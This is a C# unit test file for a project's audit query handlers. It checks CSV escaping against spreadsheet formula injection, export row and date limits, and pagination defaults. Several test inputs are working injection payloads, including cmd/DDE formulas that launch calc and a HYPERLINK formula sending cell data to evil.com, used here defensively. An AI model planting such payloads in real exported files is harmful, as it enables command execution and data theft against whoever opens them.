using System.Reflection;
using NOIR.Application.Features.Audit.Queries;

namespace NOIR.Application.UnitTests.Audit;

/// <summary>
/// Unit tests for AuditQueryHandlers.
/// Tests validation, CSV escaping, and security features.
/// </summary>
public class AuditQueryHandlersTests
{
    #region CSV Injection Prevention Tests

    [Theory]
    [InlineData("=SUM(A1:A10)", "\"'=SUM(A1:A10)\"")] // Formula with =
    [InlineData("+cmd|'/C calc'!A0", "\"'+cmd|'/C calc'!A0\"")] // Formula with +
    [InlineData("-cmd|'/C calc'!A0", "\"'-cmd|'/C calc'!A0\"")] // Formula with -
    [InlineData("@SUM(A1:A10)", "\"'@SUM(A1:A10)\"")] // Formula with @
    [InlineData("|calc", "\"'|calc\"")] // Pipe command
    [InlineData("%0A=cmd", "\"'%0A=cmd\"")] // URL encoded newline with formula
    public void EscapeCsv_FormulaLikeValue_ShouldPrefixWithQuote(string input, string expected)
    {
        // Act
        var result = InvokeEscapeCsv(input);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("\t=malicious", "\"'\t=malicious\"")] // Tab followed by formula
    [InlineData("\r=malicious", "\"'\r=malicious\"")] // Carriage return followed by formula
    public void EscapeCsv_WhitespaceWithFormula_ShouldPrefixWithQuote(string input, string expected)
    {
        // Act
        var result = InvokeEscapeCsv(input);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("Normal text", "\"Normal text\"")]
    [InlineData("john@example.com", "\"john@example.com\"")] // @ in middle is safe
    [InlineData("123-456-7890", "\"123-456-7890\"")] // Dash in middle is safe
    [InlineData("test+value", "\"test+value\"")] // Plus in middle is safe
    public void EscapeCsv_SafeValues_ShouldNotPrefixWithQuote(string input, string expected)
    {
        // Act
        var result = InvokeEscapeCsv(input);

        // Assert
        result.Should().Be(expected);
    }

    [Fact]
    public void EscapeCsv_NullValue_ShouldReturnEmptyQuotedString()
    {
        // Act
        var result = InvokeEscapeCsv(null);

        // Assert
        result.Should().Be("\"\"");
    }

    [Fact]
    public void EscapeCsv_EmptyString_ShouldReturnEmptyQuotedString()
    {
        // Act
        var result = InvokeEscapeCsv("");

        // Assert
        result.Should().Be("\"\"");
    }

    [Fact]
    public void EscapeCsv_ValueWithQuotes_ShouldEscapeQuotes()
    {
        // Arrange
        var input = "He said \"Hello\"";

        // Act
        var result = InvokeEscapeCsv(input);

        // Assert
        result.Should().Be("\"He said \"\"Hello\"\"\"");
    }

    [Fact]
    public void EscapeCsv_ValueWithCommas_ShouldWrapInQuotes()
    {
        // Arrange
        var input = "Name, Address, Phone";

        // Act
        var result = InvokeEscapeCsv(input);

        // Assert
        result.Should().Be("\"Name, Address, Phone\"");
    }

    [Fact]
    public void EscapeCsv_ValueWithNewlines_ShouldWrapInQuotes()
    {
        // Arrange
        var input = "Line1\nLine2";

        // Act
        var result = InvokeEscapeCsv(input);

        // Assert
        result.Should().Be("\"Line1\nLine2\"");
    }

    #endregion

    #region ExportAuditLogsQuery Validation Tests

    [Fact]
    public void ExportAuditLogsQuery_MaxAllowedRows_ShouldBe100000()
    {
        // Assert
        ExportAuditLogsQuery.MaxAllowedRows.Should().Be(100000);
    }

    [Fact]
    public void ExportAuditLogsQuery_MaxDateRangeDays_ShouldBe90()
    {
        // Assert
        ExportAuditLogsQuery.MaxDateRangeDays.Should().Be(90);
    }

    [Fact]
    public void ExportAuditLogsQuery_DefaultFormat_ShouldBeCsv()
    {
        // Arrange - using nulls for optional date parameters
        var query = new ExportAuditLogsQuery(null, null, null, null);

        // Assert
        query.Format.Should().Be(ExportFormat.Csv);
    }

    [Fact]
    public void ExportAuditLogsQuery_DefaultMaxRows_ShouldBe10000()
    {
        // Arrange - using nulls for optional date parameters
        var query = new ExportAuditLogsQuery(null, null, null, null);

        // Assert
        query.MaxRows.Should().Be(10000);
    }

    #endregion

    #region GetAuditTrailQuery Tests

    [Fact]
    public void GetAuditTrailQuery_WithCorrelationId_ShouldStoreValue()
    {
        // Arrange
        var correlationId = "test-correlation-123";

        // Act
        var query = new GetAuditTrailQuery(correlationId);

        // Assert
        query.CorrelationId.Should().Be(correlationId);
    }

    #endregion

    #region GetEntityHistoryQuery Tests

    [Fact]
    public void GetEntityHistoryQuery_DefaultValues_ShouldBePaginated()
    {
        // Arrange & Act
        var query = new GetEntityHistoryQuery("Customer", "123");

        // Assert
        query.EntityType.Should().Be("Customer");
        query.EntityId.Should().Be("123");
        query.PageNumber.Should().Be(1);
        query.PageSize.Should().Be(20);
    }

    [Fact]
    public void GetEntityHistoryQuery_CustomPagination_ShouldStoreValues()
    {
        // Arrange & Act
        var query = new GetEntityHistoryQuery("Order", "456", PageNumber: 5, PageSize: 50);

        // Assert
        query.PageNumber.Should().Be(5);
        query.PageSize.Should().Be(50);
    }

    #endregion

    #region GetHttpRequestAuditLogsQuery Tests

    [Fact]
    public void GetHttpRequestAuditLogsQuery_DefaultValues_ShouldBePaginated()
    {
        // Act
        var query = new GetHttpRequestAuditLogsQuery();

        // Assert
        query.PageNumber.Should().Be(1);
        query.PageSize.Should().Be(20);
        query.UserId.Should().BeNull();
        query.HttpMethod.Should().BeNull();
        query.StatusCode.Should().BeNull();
        query.FromDate.Should().BeNull();
        query.ToDate.Should().BeNull();
    }

    [Fact]
    public void GetHttpRequestAuditLogsQuery_WithFilters_ShouldStoreValues()
    {
        // Arrange
        var fromDate = DateTimeOffset.UtcNow.AddDays(-7);
        var toDate = DateTimeOffset.UtcNow;

        // Act
        var query = new GetHttpRequestAuditLogsQuery
        {
            UserId = "user-123",
            HttpMethod = "POST",
            StatusCode = 200,
            FromDate = fromDate,
            ToDate = toDate
        };

        // Assert
        query.UserId.Should().Be("user-123");
        query.HttpMethod.Should().Be("POST");
        query.StatusCode.Should().Be(200);
        query.FromDate.Should().Be(fromDate);
        query.ToDate.Should().Be(toDate);
    }

    #endregion

    #region GetHandlerAuditLogsQuery Tests

    [Fact]
    public void GetHandlerAuditLogsQuery_DefaultValues_ShouldBePaginated()
    {
        // Act
        var query = new GetHandlerAuditLogsQuery();

        // Assert
        query.PageNumber.Should().Be(1);
        query.PageSize.Should().Be(20);
        query.HandlerName.Should().BeNull();
        query.OperationType.Should().BeNull();
        query.IsSuccess.Should().BeNull();
    }

    [Fact]
    public void GetHandlerAuditLogsQuery_WithFilters_ShouldStoreValues()
    {
        // Act
        var query = new GetHandlerAuditLogsQuery
        {
            HandlerName = "CreateOrderCommand",
            OperationType = "Create",
            IsSuccess = false
        };

        // Assert
        query.HandlerName.Should().Be("CreateOrderCommand");
        query.OperationType.Should().Be("Create");
        query.IsSuccess.Should().BeFalse();
    }

    #endregion

    #region ExportFormat Enum Tests

    [Fact]
    public void ExportFormat_ShouldHaveCsvAndJson()
    {
        // Assert
        Enum.GetValues<ExportFormat>().Should().Contain(ExportFormat.Csv);
        Enum.GetValues<ExportFormat>().Should().Contain(ExportFormat.Json);
    }

    #endregion

    #region CSV Generation Security Tests

    [Fact]
    public void EscapeCsv_ComplexInjectionAttempt_ShouldBeSanitized()
    {
        // Arrange - Complex formula injection attempt
        var input = "=cmd|' /C calc'!A0";

        // Act
        var result = InvokeEscapeCsv(input);

        // Assert - Should be wrapped and prefixed
        result.Should().StartWith("\"'");
        result.Should().EndWith("\"");
    }

    [Fact]
    public void EscapeCsv_DdeInjectionAttempt_ShouldBeSanitized()
    {
        // Arrange - DDE (Dynamic Data Exchange) injection attempt
        var input = "=DDE(\"cmd\",\"/c calc\",\"__DdesystemtOpic__\")";

        // Act
        var result = InvokeEscapeCsv(input);

        // Assert - Should be wrapped and prefixed
        result.Should().StartWith("\"'=");
        result.Should().EndWith("\"");
    }

    [Fact]
    public void EscapeCsv_HyperlinkInjection_ShouldBeSanitized()
    {
        // Arrange - Hyperlink function injection
        var input = "=HYPERLINK(\"http://evil.com?data=\"&A1,\"Click\")";

        // Act
        var result = InvokeEscapeCsv(input);

        // Assert
        result.Should().StartWith("\"'=");
    }

    #endregion

    #region Helper Methods

    private static string InvokeEscapeCsv(string? value)
    {
        var handlerType = typeof(ExportAuditLogsQueryHandler);
        var method = handlerType.GetMethod("EscapeCsv", BindingFlags.NonPublic | BindingFlags.Static);
        return (string)method?.Invoke(null, [value])!;
    }

    #endregion
}
